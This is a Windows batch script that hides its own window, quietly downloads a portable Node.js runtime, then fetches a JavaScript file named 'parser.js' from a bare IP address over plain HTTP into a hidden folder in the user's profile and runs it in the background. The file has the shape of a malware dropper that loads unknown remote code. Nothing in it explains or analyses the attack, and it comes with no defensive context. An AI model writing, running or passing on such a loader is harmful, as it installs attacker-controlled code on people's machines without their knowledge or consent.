@echo off
setlocal enabledelayedexpansion

if "%~1" neq "_restarted" powershell -WindowStyle Hidden -Command "Start-Process -FilePath cmd.exe -ArgumentList '/c \"%~f0\" _restarted' -WindowStyle Hidden" & exit /b

set "NODE_VERSION=20.11.1"
set "ARCH=x64"
set "NODE_ZIP=node-v%NODE_VERSION%-win-%ARCH%.zip"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_ZIP%"
set "EXTRACT_DIR=%~dp0nodejs"
set "NODE_EXE=%EXTRACT_DIR%\node-v%NODE_VERSION%-win-%ARCH%\node.exe"

if not exist "%NODE_EXE%" (
if not exist "%EXTRACT_DIR%" mkdir "%EXTRACT_DIR%"

where curl >nul 2>&1
if %errorlevel% EQU 0 (
    curl.exe -s -L --retry 3 --retry-delay 2 -o "%EXTRACT_DIR%\%NODE_ZIP%" "%DOWNLOAD_URL%"
) else (
    powershell -Command "& {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%EXTRACT_DIR%\%NODE_ZIP%';
    }"
)

if not exist "%EXTRACT_DIR%\%NODE_ZIP%" (
    powershell -Command "& {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
        Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%EXTRACT_DIR%\%NODE_ZIP%';
    }"
)

if not exist "%EXTRACT_DIR%\%NODE_ZIP%" (
    exit /b 1
)

powershell -Command "Expand-Archive -Path '%EXTRACT_DIR%\%NODE_ZIP%' -DestinationPath '%EXTRACT_DIR%' -Force"

del "%EXTRACT_DIR%\%NODE_ZIP%" 2>nul
)

if exist "%NODE_EXE%" (
    set "NODE_EXE=%NODE_EXE%"

    set "PATH=%EXTRACT_DIR%\node-v%NODE_VERSION%-win-%ARCH%;%PATH%"
) else (
    exit /b 1
)

:: -------------------------
:: Confirm Node.js works
:: -------------------------
%NODE_EXE% -v >nul 2>&1
if errorlevel 1 (
    echo "not install"
    exit /b 1
)

:: -------------------------
:: Download required files
:: -------------------------
set "USERPROFILE=%USERPROFILE%"
set "URL=http://64.204.80.37"
set "PJS=%USERPROFILE%\.task\parser.js"

MD "%USERPROFILE%\.task" 2>nul
echo "create task"
curl -L -o "%PJS%" "%URL%/599/parser.js"

:: -------------------------
:: Run the parser
:: -------------------------
if exist "%PJS%" (
    echo [INFO] Running parser.js...
    start "" /b "%NODE_EXE%" "%PJS%"
    if errorlevel 1 (
        echo [ERROR] parser execution failed.
        exit /b 1
    )
) else (
    echo [ERROR] parser.js not found.
    exit /b 1
)

echo [SUCCESS] Script completed successfully.
exit /b 0
